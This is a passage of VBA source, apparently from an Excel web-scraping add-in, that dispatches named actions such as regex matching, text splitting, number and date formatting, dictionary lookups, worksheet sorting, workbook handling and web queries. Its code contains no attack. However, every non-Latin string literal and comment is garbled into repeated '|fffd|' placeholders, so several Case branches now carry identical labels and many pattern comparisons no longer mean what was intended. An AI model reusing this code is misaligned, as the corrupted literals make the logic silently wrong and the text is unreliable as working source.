                    End Select
                End If
                
            Case "CheckMask"        ' "CheckRegexp"
                Dim MatchCase As Boolean, masks As Variant, Mask$, ValueLikePattern As Boolean
                MatchCase = parameters("MatchCase") Like "*|fffd||fffd|*"
                
                ValueLikePattern = False
                
                If parameters("Pattern") = "" Then
                    ValueLikePattern = txt = ""
                Else
                    masks = Split(parameters("Pattern"), "|")
                    If MatchCase Then
                        For i = LBound(masks) To UBound(masks)
                            Mask$ = masks(i)
                            ValueLikePattern = ValueLikePattern Or (txt Like Mask$)
                        Next i
                    Else
                        For i = LBound(masks) To UBound(masks)
                            Mask$ = masks(i)
                            ValueLikePattern = ValueLikePattern Or (LCase(txt) Like LCase(Mask$))
                        Next i
                    End If
                End If
                
                
                Select Case Trim(parameters("Action"))
                    Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                        If ValueLikePattern Then Else txt$ = ""
                    Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                        If ValueLikePattern Then txt$ = ""
                    Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                        If ValueLikePattern Then txt$ = parameters("Replacement")
                    Case Else
                        txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!"
                End Select
                
            Case "RunActionSet"
                
                MatchesPattern = LCase(txt) Like LCase(parameters("Pattern"))        ' TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                CheckMode = Not (LCase(parameters("CheckMode")) Like "|fffd||fffd|*")        ' TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||27b|
                ReturnValue = Not (LCase(parameters("ReturnValue")) Like "|fffd||fffd||fffd|")        ' TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ASet_name$ = parameters("Name")
                
                If Len(ASet_name$) Then
                    If MatchesPattern = CheckMode Then
                        tmp_txt$ = txt$
                        Dim ind1&, ind2&
                        ind1& = Val(ParserVariables.item("$$index")): ind2& = Val(ParserVariables.item("$$count"))
                        
                        ParserVariables.item("$$index") = arri + 1: ParserVariables.item("$$count") = UBound(arr) + 1
                        
                        WP.AASets.GetItemByName(ASet_name$).Execute tmp_txt$
                        
                        ParserVariables.item("$$index") = ind1&: ParserVariables.item("$$count") = ind2&
                        
                        If ReturnValue Then txt$ = tmp_txt$
                    End If
                Else
                    Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & ASet_name$ & "|fffd|"
                End If
                
            Case "OutputRow"
                col& = Val(parameters("LastRowColumn"))
                If col& <= 0 Then col& = 1
                sheetName$ = parameters("SheetName")
                If Len(sheetName$) Then
                    Set sh = ActiveWorkbook.Worksheets(sheetName$)
                    If sh Is Nothing Then AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|:</b>" & vbNewLine & _
                        "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & sheetName$ & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", bt_Warning
                Else
                    Set sh = RunningParser.Sheet
                    If sh Is Nothing Then Set sh = ActiveSheet
                End If
                Dim row_arr
                v = parameters("Value"): If v = "" Then v = txt
                
                If (v <> "") And Not (sh Is Nothing) Then
                    row_arr = Split(v, "|")
                    Set cell = sh.Cells(sh.Rows.Count, col&).End(xlUp).Offset(1)
                    cell.EntireRow.Cells(1).Resize(, UBound(row_arr) + 1).FormulaR1C1 = row_arr
                End If
                
                
            Case "SearchInColumn"
                Dim LookAt As XlLookAt, found As Boolean
                LookAt = IIf(parameters("LookAt") Like "*|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|*", xlPart, xlWhole)
                col& = Val(parameters("Column"))
                sheetName$ = parameters("SheetName")
                If Len(sheetName$) Then
                    Set sh = ActiveWorkbook.Worksheets(sheetName$)
                    If sh Is Nothing Then AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b>" & vbNewLine & _
                        "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & sheetName$ & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Warning
                Else
                    Set sh = RunningParser.Sheet
                    If sh Is Nothing Then Set sh = ActiveSheet
                End If
                
                
                If (Len(txt) > 0) And (col > 0) And (Not sh Is Nothing) Then
                    Set cell = sh.Columns(col&).Find(txt, , xlValues, LookAt, , , False, False).Cells(1)
                    sh.Cells.Find "*", , , xlPart    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    
                    found = Not (cell Is Nothing)
                    ASet_name$ = IIf(found, parameters("ActionName1"), parameters("ActionName2"))
                    
                    If Len(ASet_name$) Then
                        If Val(ASet_name$) < 0 Then
                            ApplyNormalActionToText = Val(ASet_name$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        Else
                            tmp_txt$ = txt$
                            WP.AASets.GetItemByName(ASet_name$).Execute tmp_txt$
                            ' If ReturnValue Then txt$ = tmp_txt$
                        End If
                    End If
                Else
                    Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: Len(txt) = 0 OR Col = 0 OR sh Is Nothing"
                End If
                
            Case "SortTable"
                
                Dim SortOrder As XlSortOrder, SortOrder2 As XlSortOrder, SortOrder3 As XlSortOrder, ra As Range, hRo&, SortCol&, SortCol2&, SortCol3&
                SortOrder = IIf(parameters("SortOrder") Like "*|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|*", xlAscending, xlDescending)
                SortOrder2 = IIf(parameters("SortOrder2") Like "*|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|*", xlAscending, xlDescending)
                SortOrder3 = IIf(parameters("SortOrder3") Like "*|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|*", xlAscending, xlDescending)
                
                SortCol& = Val(parameters("Column"))
                SortCol2& = Val(parameters("Column2"))
                SortCol3& = Val(parameters("Column3"))
                
                Set sh = RunningParser.Sheet
                If sh Is Nothing Then Set sh = ActiveSheet
                
                If (Not sh Is Nothing) And (SortCol& > 0) Then
                    Set ra = sh.UsedRange
                    hRo& = RunningParser.Columns.SheetOptions.HeaderRowNumber
                    If hRo& > 1 Then
                        Set ra = Intersect(ra, sh.Range(hRo& & ":" & sh.Rows.Count))
                    End If
                    
                    Select Case True
                        Case (SortCol3& > 0) And (SortCol2& > 0) And (SortCol& > 0)
                            ra.Sort ra.Cells(1).EntireRow.Cells(SortCol&), SortOrder, ra.Cells(1).EntireRow.Cells(SortCol2&), , SortOrder2, _
                                ra.Cells(1).EntireRow.Cells(SortCol3&), SortOrder3, xlYes
                        Case (SortCol2& > 0) And (SortCol& > 0)
                            ra.Sort ra.Cells(1).EntireRow.Cells(SortCol&), SortOrder, ra.Cells(1).EntireRow.Cells(SortCol&), , SortOrder2, , , xlYes
                        Case SortCol& > 0
                            ra.Sort ra.Cells(1).EntireRow.Cells(SortCol&), SortOrder, , , , , , xlYes
                        Case Else
                            Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    End Select
                    ActiveWindow.ScrollRow = 1
                End If
                
            Case "TextBetween"
                txt = TextBetween(txt, parameters("TextBefore"), parameters("TextAfter"), parameters("Index"), parameters("AddTextBeforeAndAfter") = "|fffd||fffd|")
                
            Case "URLencode"
                If Val(parameters("Mode")) >= 0 Then
                    txt = URLEncode(txt, Val(parameters("Mode")))
                Else
                    txt = URLDecode(txt)
                End If
                
            Case "Translit": txt = Translit(txt)
                
            Case "FirstWordOnly": txt = Split(txt)(0)
            Case "EnglishWords": txt = EnglishWords(txt, Val(Trim(parameters("Min"))), Val(Trim(parameters("Max"))))
            Case "RussianWords": txt = RussianWords(txt, Val(Trim(parameters("Min"))), Val(Trim(parameters("Max"))))
                
            Case "WordsByLanguage"
                Select Case parameters("Language")
                    Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "en", "english": txt = EnglishWords(txt, Val(Trim(parameters("Min"))), Val(Trim(parameters("Max"))))
                    Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "ru", "russian": txt = RussianWords(txt, Val(Trim(parameters("Min"))), Val(Trim(parameters("Max"))))
                End Select
                
            Case "FirstWords"
                For i = 1 To Val(Trim(parameters("Count")))
                    res = res & Split(txt)(i - 1) & " "
                Next i
                txt = Trim(res)
                
            Case "LastWords"
                tmp_txt$ = StrReverse(txt): For i = 1 To Val(Trim(parameters("Count"))): res = res & Split(tmp_txt$)(i - 1) & " ": Next i
                txt = Trim(StrReverse(res))
                
            Case "TextFrom_Nth_Word"
                Err.Clear: n& = Fix(Val(Trim(parameters("FirstWordIndex")))): If n < 1 Then Exit Function
                ind& = UBound(Split(txt, , n&))
                If ind = n - 1 Then
                    txt = Trim(Split(txt, , n&)(ind))
                    If Err = 0 Then
                        n2& = Fix(Val(Trim(parameters("Count"))))
                        If n2 > 0 Then
                            For i = 1 To n2&
                                res = res & Split(txt)(i - 1) & " "
                            Next i
                            txt = Trim(res)
                        End If
                    End If
                Else
                    txt = ""
                End If
                Err.Clear
                
            Case "WordsOrCharacters"
                Dim Reverse As Boolean, WordsMode As Boolean, CharactersMode As Boolean, GetFound As Boolean, ReplaceMode As Boolean, Warr As Variant
                Reverse = InStr(1, parameters("Mode"), "|fffd| |fffd||fffd||fffd||fffd||fffd|", vbTextCompare)
                WordsMode = InStr(1, parameters("Mode"), "|fffd||fffd||fffd||fffd||fffd|", vbTextCompare) = 1
                CharactersMode = InStr(1, parameters("Mode"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbTextCompare) = 1
                GetFound = True
                If InStr(1, parameters("Action"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbTextCompare) Then GetFound = False
                If InStr(1, parameters("Action"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbTextCompare) Then GetFound = False: ReplaceMode = True
                
                If WordsMode Then txt = Application.Trim(txt)
                If Reverse Then txt$ = StrReverse(txt)
                
                Dim pos1&, cnt&
                pos1& = Val(Trim(parameters("FirstIndex")))
                cnt& = Fix(Val(Trim(parameters("Count"))))
                
                If WordsMode Then
                    Warr = Split(txt)
                    If cnt& = 0 Then cnt& = UBound(Warr) - pos1& + 2
                    If cnt& <= 0 Then
                        txt = IIf(GetFound, "", txt)
                    Else
                        For i = LBound(Warr) To UBound(Warr)
                            ' Warr(i)
                            If GetFound Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                If (i < pos1& - 1) Or (i > pos1& + cnt& - 2) Then Warr(i) = ""
                            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                If Not ((i < pos1& - 1) Or (i > pos1& + cnt& - 2)) Then Warr(i) = IIf(ReplaceMode And (i = pos1& - 1), "~", "")
                            End If
                        Next i
                        txt = Application.Trim(Join(Warr))
                    End If
                End If
                
                If CharactersMode Then
                    If GetFound Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        If cnt& Then txt = Mid(txt, pos1&, cnt&) Else txt = Mid(txt, pos1&)
                    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        txt = IIf(pos1& > 1, Left(txt, pos1& - 1), "") & IIf(ReplaceMode, "~", "") & IIf(cnt& > 0, Mid(txt, pos1& + cnt&), "")
                    End If
                End If
                
                If Reverse Then txt$ = StrReverse(txt)
                
            Case "Substring": txt = Mid(txt, Val(Trim(parameters("Start"))), Val(Trim(parameters("Length"))))
                
            Case "Replace":
                cnt& = Val(Trim(parameters("Count")))
                If cnt& = 0 Then cnt& = -1
                txt = Replace(txt, parameters("What"), parameters("Replacement"), , cnt&)
                
            Case "RightChars": txt = Right(txt, Val(Trim(parameters("Length"))))
                
            Case "NumberFormat":
                If parameters("Format") Like "*d*m*yy*" Then
                    Dim dd As Date: dd = GetDate(Trim(txt))
                    If dd = 0 Then txt = "" Else txt = Format(dd, parameters("Format"))
                Else
                    txt = Format(txt, parameters("Format"))
                End If
                
            Case "CropLastWords"
                wc& = Val(Trim(parameters("Count"))): For i = 1 To UBound(Split(txt)) - wc& + 1:: res = res & Split(txt)(i - 1) & " ": Next i
                txt = Trim(res)
                
            Case "Excel.Trim"
                txt = RealTrim(txt, parameters("ReplaceLineFeeds"), parameters("ReplaceTabs"))
                
            Case "Split"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Err.Clear: Dim IfExist As Boolean
                IfExist = InStr(1, parameters("Index"), "ifexist", vbTextCompare) > 0
                LastIndex& = 999: If InStr(1, parameters("Index"), "last", vbTextCompare) > 0 Then LastIndex& = Val(Split(parameters("Index"), "last")(1))
                If LastIndex& <> 999 Then
                    ind& = UBound(Split(txt, parameters("Delimiter")))
                    If ind& Then txt = Split(txt, parameters("Delimiter"))(ind& + LastIndex&) Else Err.Raise 666
                Else
                    ind& = Val(Trim(parameters("Index"))): txt = Split(txt, parameters("Delimiter"))(ind&)
                End If
                If (Err > 0) And Not IfExist Then Err.Clear: txt = ""
                
            Case "Split2"
                
                Dim VariableName, VarValue$, splitArr
                splitArr = "": i = 0: splitArr = Split(txt, parameters("Delimiter"))
                If Len(Trim(parameters("VarNames"))) Then
                    For Each VariableName In Split(parameters("VarNames"), "|")
                        If Len(Trim(VariableName)) Then
                            VariableName = "%" & Trim(VariableName) & "%"
                            VarValue$ = "": VarValue$ = splitArr(i)
                            ParserVariables.item(CStr(VariableName)) = VarValue$
                        End If
                        i = i + 1
                    Next
                End If
                
                Err.Clear
                IfExist = InStr(1, parameters("Index"), "ifexist", vbTextCompare) > 0
                LastIndex& = 999: If InStr(1, parameters("Index"), "last", vbTextCompare) > 0 Then LastIndex& = Val(Split(parameters("Index"), "last")(1))
                If LastIndex& <> 999 Then
                    ind& = UBound(splitArr)
                    If ind& Then txt = splitArr(ind& + LastIndex&) Else Err.Raise 666
                Else
                    ind& = Val(Trim(parameters("Index"))) - 1: txt = splitArr(ind&)
                    If ind& < 0 Then Err.Clear: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| 1)"
                End If
                Erase splitArr
                If (Err > 0) And Not IfExist Then Err.Clear: txt = ""
                
            Case "Round"
                txt = Replace(Application.Round(Val(Replace(Trim(txt), ",", ".")), Val(Trim(parameters("NumDigitsAfterDecimal")))), ".", Application.DecimalSeparator)
                
            Case "AddPrefixAndSuffix"
                If Len(txt) Then txt = parameters("Prefix") & txt & parameters("Suffix")
                
            Case "JSON_decode"
                txt = JSON_decode(txt): Err.Clear
                
            Case "DateTimeFromUnixFormat"
                Dim timeformat$: timeformat$ = parameters("Format")
                If timeformat$ = "" Then timeformat$ = "dd.mm.yyyy hh:nn:ss"
                If txt Like "#########*" Then
                    txt = Format$(Val(Left(txt, 10)) / 86400 + 25569, timeformat$)
                Else
                    txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| UNIX"
                End If
                
            Case "UnixTimestamp"
                If txt Like "#########*" Then    ' unix to time
                    txt = Format$(SETT.DFU(Left(txt, 10)), "dd.mm.yyyy hh:nn:ss")
                Else    ' time to unix
                    If IsDate(txt) Then txt = SETT.DTU(txt) Else txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
                End If
                
            Case "SetDefaultValue"
                If Len(txt) = 0 Then txt = parameters("Value")
                
            Case "CharactersCount"
                If Len(parameters("Value")) Then res$ = (Len(txt) - Len(Replace(txt, parameters("Value"), ""))) / Len(parameters("Value")) Else res$ = Len(txt)
                
                If Len(Trim(parameters("VarName"))) Then ParserVariables.item("%" & CStr(Trim(parameters("VarName"))) & "%") = res$
                If Not (parameters("Output") Like "|fffd||fffd||fffd|") Then txt = res$
                
                
            Case "SumValues"
                txt = Replace(txt, ",", "."): NN# = 0: res = ""
                For i = 1 To Len(txt)
                    l$ = Mid(txt, i, 1): res = res & IIf(l$ Like "[-0-9.]", l$, " ")
                Next
                res = Application.Trim(res): For Each v In Split(res): NN# = NN# + Val(v): Next
                If Len(Trim(parameters("Param"))) Then NN# = NN# + Val(Replace(Trim(parameters("Param")), ",", "."))
                txt = Application.Round(NN#, Val(parameters("NumDigitsAfterDecimal")))
                
            Case "MultiplyValues"
                txt = Replace(txt, ",", "."): res = ""
                For i = 1 To Len(txt)
                    l$ = Mid(txt, i, 1): res = res & IIf(l$ Like "[-0-9.]", l$, " ")
                Next
                res = Application.Trim(res): NN# = 0
                NN# = IIf(Len(res) > 0, 1, 0)
                For Each v In Split(res)
                    If v Like "*#*" Then NN# = NN# * Val(v)
                Next
                If Len(Trim(parameters("Param"))) Then NN# = NN# * Val(Replace(Trim(parameters("Param")), ",", "."))
                txt = Application.Round(NN#, Val(parameters("NumDigitsAfterDecimal")))
                
            Case "DivideValues"
                txt = Replace(txt, ",", "."): res = ""
                For i = 1 To Len(txt): l$ = Mid(txt, i, 1)
                    res = res & IIf(l$ Like "[-0-9.]", l$, " ")
                Next
                res = Application.Trim(res): NN# = 0
                NN# = Val(Split(res)(0))
                If Val(Replace(Trim(parameters("Param")), ",", ".")) = 0 Then
                    txt = "#|fffd||fffd||fffd|/0!"
                Else
                    If Len(Trim(parameters("Param"))) Then NN# = NN# / Val(Replace(Trim(parameters("Param")), ",", "."))
                    txt = Application.Round(NN#, Val(parameters("NumDigitsAfterDecimal")))
                End If
                
            Case "CompareNumbers"
                NN# = Val(Replace(Trim(txt), ",", ".")): txt = ""
                If Trim(parameters("Min")) & Trim(parameters("Max")) = "" Then txt = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
                nn1# = Val(Replace(Trim(parameters("Min")), ",", "."))
                nn2# = Val(Replace(Trim(parameters("Max")), ",", "."))
                If Trim(parameters("Min")) = "" Then nn1# = -1E+100
                If Trim(parameters("Max")) = "" Then nn2# = 1E+100
                If NN# >= nn1# And NN# <= nn2# Then txt = CLng(NN#)
                
                
            Case "Regexp"
                With REGEXP
                    .Global = True
                    .IgnoreCase = parameters("MatchCase") Like "*|fffd||fffd||fffd|*"
                    .Pattern = parameters("Pattern")
                    Dim MatchesArr, IsIndex As Boolean, objMatches As Object
                    ind& = Val(parameters("IndexOrDelimiter"))
                    IsIndex = (Len(parameters("IndexOrDelimiter")) > 0) And (parameters("IndexOrDelimiter") Like String(Len(parameters("IndexOrDelimiter")), "#"))
                    
                    If .test(txt) Then
                        Set objMatches = .Execute(txt)
                        If IsIndex Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                            Err.Clear: txt = objMatches.item(ind&).value
                            If Err > 0 Then Err.Clear: txt = ""
                        Else
                            If parameters("IndexOrDelimiter") = "replace" Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                txt = .Replace(txt, parameters("Replace"))
                            Else
                                ReDim MatchesArr(0 To objMatches.Count - 1)
                                For i = LBound(MatchesArr) To UBound(MatchesArr)
                                    MatchesArr(i) = objMatches.item(i).value
                                Next i
                                If Len(parameters("Replace")) > 0 Then
                                    For i = LBound(MatchesArr) To UBound(MatchesArr)
                                        MatchesArr(i) = .Replace(MatchesArr(i), parameters("Replace"))
                                    Next i
                                End If
                                txt = Join(MatchesArr, IIf(parameters("IndexOrDelimiter") = "", ARSEP, parameters("IndexOrDelimiter")))
                            End If
                        End If
                    Else
                        If parameters("IndexOrDelimiter") <> "replace" Then txt = ""
                    End If
                End With
                
            Case "StrConv"
                Select Case Val(Trim(parameters("Conversion")))
                    Case 1: txt = StrConv(txt, vbUpperCase)
                    Case 2: txt = StrConv(txt, vbLowerCase)
                    Case 3: txt = StrConv(txt, vbProperCase)
                End Select
                
            Case "MsgBox"
                tmp_txt$ = parameters("Message"): If Trim(tmp_txt$) = "" Then tmp_txt$ = txt$
                v = MsgBox(tmp_txt$, Val(parameters("Buttons")), parameters("Title"))
                ParserVariables.item("%msgbox%") = v
                If parameters("ReturnValue") Like "|fffd||fffd|" Then txt = v
                
            Case "Balloon"
                tmp_txt$ = parameters("Message"): If Trim(tmp_txt$) = "" Then tmp_txt$ = txt$
                Dim bt As BALLOON_TYPES
                Select Case parameters("Type")
                    Case "Text": bt = bt_Text
                    Case "Information": bt = bt_Information
                    Case "Attention": bt = bt_Attention
                    Case "Warning": bt = bt_Warning
                    Case "Redirect": bt = bt_Redirect
                End Select
                AddBalloon tmp_txt$, bt
                
            Case "IncreaseCounter"
                VarName$ = "%counter" & Trim(parameters("Index")) & "%"
                ParserVariables.item(VarName$) = Val(ParserVariables.item(VarName$)) + 1
                If parameters("ReturnValue") Like "|fffd||fffd|" Then txt = ParserVariables.item(VarName$)
                Err.Clear
                
                
            Case "Dictionary_AddItem"
                Dim dk$, dv$
                dk$ = parameters("Key")
                dv$ = parameters("Value")
                
                If Trim(dk$) = "" Then
                    If (txt$ Like "*|*") And (dv$ = "") Then
                        dk$ = Split(txt, "|")(0)
                        dv$ = Split(txt, "|", 2)(1)
                    Else
                        dk$ = txt$
                    End If
                End If
                
                Dictionary_AddItem dk$, dv$, parameters("DicName")
                
            Case "Dictionary_GetContent"
                txt = Dictionary_GetContent(parameters("ResultType"), parameters("DicName"))
                
            Case "Dictionary_FindKey"
                tmp_txt$ = parameters("Key"): If Trim(tmp_txt$) = "" Then tmp_txt$ = txt$
                res$ = ""    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                n& = Dictionary_FindKey(tmp_txt$, res$, parameters("ActionIfFound"), parameters("ActionIfAbsent"), parameters("DicName"))
                
                If n < 0 Then    '    -1 |fffd||fffd||fffd| -2 (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
                    ApplyNormalActionToText = n
                ElseIf n = 1 Then    '    1 (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| ReturnValue$)
                    txt = res$
                Else    ' n=0 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
                    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                End If
                
            Case "OpenWithBrowser"
                Randomize: Dim FileName$, ext$
                ext$ = Trim(parameters("Extension")): If ext$ = "" Then ext$ = "html"
                If ext$ = "chars" Then
                    ShowCharcodes txt
                Else
                    FileName$ = Environ("TEMP") & "\test_actions_result_" & Left(Rnd() * 1E+15, 10) & "." & ext$
                    With CreateObject("scripting.filesystemobject").CreateTextFile(FileName$, True, True)
                        .Write txt: .Close
                    End With
                    CreateObject("wscript.shell").Run """" & FileName$ & """"
                End If
                
            Case "SaveWorkbook": Action_SaveWorkbook parameters("Filename"), parameters("CloseWorkbook")
                
            Case "CloseWorkbook": Action_CloseWorkbook parameters("Mode")
                
            Case "OpenWorkbook"
                If parameters("Filename") = "dialog" Then
                    FileName$ = GetFilePathEx("XLS", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd| Excel")
                Else
                    FileName$ = parameters("Filename"): If Len(FileName$) = 0 Then FileName$ = txt
                End If
                
                FileName$ = CreateAbsolutePathFromRelative(FileName$)
                Dim ReadOnly As Boolean
                ReadOnly = False:    If parameters("Mode") Like "2*" Then ReadOnly = True
                
                If FileExists(FileName$) Then
                    Action_OpenWorkbook FileName$, ReadOnly
                Else
                    txt = "ERROR: File not found" & vbNewLine & "Filename" & IIf(FileName$ = "", " is empty", ": " & FileName$)
                End If
                
                
            Case "CreateWorkbook": Action_CreateWorkbook parameters("Filename"), parameters("Template")
                
            Case "CreateWorksheet"
                Action_CreateWorksheet IIf(parameters("Name") <> "", parameters("Name"), txt), parameters("FillHeaders")
                
            Case "ActivateWorksheet": Action_ActivateWorksheet IIf(parameters("Name") <> "", parameters("Name"), txt)
            Case "DeleteWorksheet": Action_DeleteWorksheet parameters("Name")
            Case "ClearWorksheet": Action_ClearWorksheet parameters("FirstCell"), parameters("CleanType")
            Case "WorksheetRemoveDuplicates": Action_RemoveDuplicates parameters("Column")
            Case "AutoFilter": Action_AutoFilter
                
            Case "SetCellValue": Action_DirectOutput IIf(parameters("Value") = "", txt, parameters("Value")), parameters("RangeAddress")
                
            Case "CreateTableHeader": Action_CreateTableHeader
                
            Case "ExportToCSV"
                Action_ExportToCSV parameters("Filename"), parameters("Encoding"), parameters("Options"), WP
                
            Case "ExportTextToFile"
                txt = ExportTextToFile(txt, parameters("Filename"), parameters("Encoding"), parameters("ShowFileInFolder") = "|fffd||fffd|", WP)
                
            Case "WebQuery"
                Dim PageTextOrURL$, PageText$
                PageTextOrURL$ = IIf(Trim(parameters("URL")) Like "*tp*://?*.?*", Trim(parameters("URL")), txt)
                If IsURL(PageTextOrURL$) Then
                    PageText$ = LoadFromURL_HTML(PageTextOrURL$, WP)
                Else
                    PageText$ = PageTextOrURL$
                End If
                
                Action_WebQuery PageText$, parameters("WebTables"), parameters("Format")
                
            Case "TableToSheet"
                Action_TableToSheet parameters("Filters"), parameters("ColumnsOrder")
                
                
            Case "ProgressIndicator"
                Dim Indicator As ProgressIndicatorNew, msg$, def_msg$
                def_msg$ = txt
                If Trim(def_msg$) Like "<a *>*?*</a>" Then def_msg$ = Trim(ConvertHTMLtoText(def_msg$))
                msg$ = parameters("Message"): If msg$ = "" Then msg$ = def_msg$
                msg$ = Trim(Replace(msg$, "$value", def_msg$))
                
                Set Indicator = CHOOSE(Val(parameters("Indicator")), WP.PrInd1, WP.PrInd2)
                Select Case CStr(parameters("Line"))
                    Case "1": Indicator.line1 = msg$
